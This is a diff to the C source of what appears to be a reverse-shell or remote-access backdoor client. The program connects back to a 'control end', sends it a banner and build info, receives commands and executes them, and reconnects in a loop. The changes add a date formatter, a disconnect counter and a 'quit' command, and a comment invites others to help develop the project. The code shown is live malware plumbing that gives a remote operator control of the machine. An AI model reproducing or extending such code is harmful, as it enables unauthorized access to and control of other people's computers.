@@ -226,8 +226,21 @@ void execute_no_timeout(int sock, char* raw_cmd) {
 #endif
 }
 
-// 上线后发送彩色Logo和当前程序信息到服务端
-int show_logo(int s) {
+
+// 把 __DATE__ 转为 YYYY-MM-DD 格式
+const char *date_iso(void) {
+    static char buf[16];
+    const char *mon[] = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};
+    char m[4]; int d, y;
+    sscanf(BUILD_DATE, "%s %d %d", m, &d, &y);
+    int mm = 0;
+    for (int i=0; i<12; i++) if (!strcmp(m, mon[i])) { mm = i+1; break; }
+    sprintf(buf, "%04d-%02d-%02d", y, mm, d);
+    return buf;
+}
+
+// 上线后发送彩色Logo和当前程序信息到控制端
+int show_logo_info(int s) {
 
 #define RED     "\033[31m"
 #define GREEN   "\033[32m"
@@ -265,7 +278,7 @@ int show_logo(int s) {
             "%sVersion: %s%s%s%s, %sBuild: %s%s%s %s%s\r\n",
             // "%sProjectURL: %s%s%s\r\n"
 	    // "%sIssueURL: %s%s%s\r\n",
-        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, BUILD_DATE, BUILD_TIME, RESET//,
+        RED, BOLD, UNDERLINE, VERSION_STR, RESET, BLUE, BOLD, UNDERLINE, /*BUILD_DATE*/date_iso(), BUILD_TIME, RESET//,
         // GREEN, BOLD, PROJECT_URL, RESET, YELLOW, BOLD, ISSUE_URL, RESET, RESET
     );
 
@@ -298,8 +311,8 @@ int Payload_Demonstrate(void) {
 #else
     // 其他的默认是UNIX平台
     // Linux/BSD等等(UNIX) 实现：通过posix_spawn来打开默认计算器，避免弹出终端窗口
-    // 这里的代码还没有测试过，所以这里暂无可实现的功能
-    // 你可以根据需要修改代码，尝试打开其他默认计算器应用
+    // 这里的代码还没有测试过，所以这里暂无可实现的功能，因为Linux和BSD的计算器软件五花八门并且也不是全部都自带默认计算器软件的，是以该能暂不可成
+    // 若君愿献代码，欢迎共入此项目，同力开发
 
 #endif
     return 0;
@@ -321,6 +334,8 @@ int main(int argc, char *argv[]) {
 
     char buf[BUF_SIZE];
     char path[512];
+    // 记录初始化断连次数
+    static int drop_conn_count = 0;
 
     while (1) {
         int s;
@@ -341,7 +356,10 @@ int main(int argc, char *argv[]) {
 #endif
         }
         
-        show_logo(s);
+        show_logo_info(s);
+	char tip_buf[128];
+	sprintf(tip_buf, "[*] Disconnection count: %d\r\n", drop_conn_count);
+	send(s, tip_buf, strlen(tip_buf), 0);
         send(s, "[+] Connected successfully.\n", 27, 0);
 
         while (1) {
@@ -371,12 +389,15 @@ int main(int argc, char *argv[]) {
             // 接收控制端的命令
             memset(buf, 0, BUF_SIZE);
             int len = (int)recv(s, buf, BUF_SIZE - 1, 0);
-            if (len <= 0) break; // 控制端掐断，立刻触发重连
+            if (len <= 0) {
+		    drop_conn_count++;
+		    break;
+	    }      // 控制端掐断，记录断连次数后立刻触发重连
             
             buf[strcspn(buf, "\r\n")] = 0;
             if (strlen(buf) == 0) continue;
             
-            if (strcmp(buf, "exit") == 0) {
+            if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) {
                 send(s, "[-] Logout.\n", 12, 0);
 #ifdef _WIN32
                 closesocket(s); WSACleanup();
